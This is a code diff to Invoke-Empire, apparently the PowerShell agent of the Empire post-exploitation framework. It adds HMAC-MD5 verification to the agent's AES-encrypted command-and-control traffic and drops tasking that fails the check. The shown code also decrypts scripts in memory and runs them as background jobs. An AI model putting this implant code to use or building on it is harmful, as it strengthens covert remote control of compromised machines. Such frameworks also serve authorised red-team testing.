@@ -495,12 +495,25 @@ function Invoke-Empire {
         $AES.Mode = "CBC";
         $AES.Key = $encoding.GetBytes($SessionKey);
         $AES.IV = $IV;
-        $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
+        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
+        $hmac = New-Object System.Security.Cryptography.HMACMD5;
+        $hmac.Key = $encoding.GetBytes($SessionKey);
+        $ciphertext + $hmac.ComputeHash($ciphertext);
     } 
 
     function Decrypt-Bytes { 
         param ($inBytes)
-        if($inBytes.Length -gt 16){
+        if($inBytes.Length -gt 32){
+            # Verify the MAC
+            $mac = $inBytes[-16..-1];
+            $inBytes = $inBytes[0..($inBytes.length - 17)];
+            $hmac = New-Object System.Security.Cryptography.HMACMD5;
+            $hmac.Key = $encoding.GetBytes($SessionKey);
+            $expected = $hmac.ComputeHash($inBytes);
+            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0){
+                return;
+            }
+
             # extract the IV
             $IV = $inBytes[0..15];
             $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
@@ -779,8 +792,11 @@ function Invoke-Empire {
             elseif($type -eq 121){
                 
                 # decrypt the script in memory and execute the code as a background job
-                $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString( (Decrypt-Bytes $script:importedScript)) + "; $data")
-                Encode-Packet -type $type -data ("Job started: " + $jobID)
+                $script = Decrypt-Bytes $script:importedScript
+                if ($script){
+                    $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data")
+                    Encode-Packet -type $type -data ("Job started: " + $jobID)
+                }
             }
 
             else{
@@ -798,6 +814,9 @@ function Invoke-Empire {
 
         # Decrypt the tasking and process it appropriately
         $taskingBytes = Decrypt-Bytes $tasking
+        if (!$taskingBytes){
+            return
+        }
 
         # decode the first packet
         $decoded = Decode-Packet $taskingBytes
